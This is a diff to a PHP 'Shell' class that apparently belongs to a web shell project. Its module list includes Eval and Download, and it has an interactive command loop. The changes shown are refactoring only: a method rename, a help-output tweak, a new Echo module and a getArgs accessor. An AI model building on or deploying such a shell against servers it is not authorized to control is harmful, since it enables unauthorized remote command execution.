@@ -18,6 +18,7 @@
  * - Cp
  * - Cr3d1ts
  * - Download
+ * - Echo
  * - Edit
  * - Eval
  * - Help
@@ -381,7 +382,7 @@ class Shell
      * @access public
      * @return string
      */
-    public function getActionBrowser($sCmd = NULL)
+    public function getCommandOutput($sCmd = NULL)
     {
         $bRaw = ($sCmd !== NULL);
 
@@ -438,9 +439,9 @@ class Shell
                 $oModule = new $sModule($this, $this->oUtils, $this->oArgs);
 
                 if (($this->oArgs->getNumberOfParams() === 1) && ($this->oArgs->getParam(0) === 'help')) {
-                    $sHelp = $sModule::getHelp();
+                    $sConsole = $sModule::getHelp();
 
-                    $sConsole = implode(', ', $this->oUtils->getCommandsByModule($sModule)) . ' - ' . $sHelp;
+                    //$sConsole = implode(', ', $this->oUtils->getCommandsByModule($sModule)) . ' - ' . $sHelp;
                 } else {
                     $sConsole = $oModule->get();
                 }
@@ -578,7 +579,7 @@ class Shell
             if (count($GLOBALS['argv']) === 1) {
                 for (; ;) {
                     printf('>> ns@127.0.0.1:%s$ ', getcwd());
-                    echo $this->getActionBrowser(rtrim(fgets(STDIN)));
+                    echo $this->getCommandOutput(rtrim(fgets(STDIN)));
                 }
                 return;
             }
@@ -588,7 +589,7 @@ class Shell
          * Strasznie duzo jest kodu, wygodniej jest rozdzielic
          * to na inne metody
          */
-        echo $this->getActionBrowser();
+        echo $this->getCommandOutput();
     }
 
     /**
@@ -600,6 +601,11 @@ class Shell
     public function setArgs($sArgs)
     {
         $this->oArgs = new Args(preg_replace('~^:[^ ]+\s+~', NULL, $sArgs));
+    }
+
+    public function getArgs()
+    {
+        return $this->oArgs;
     }
 
     /**
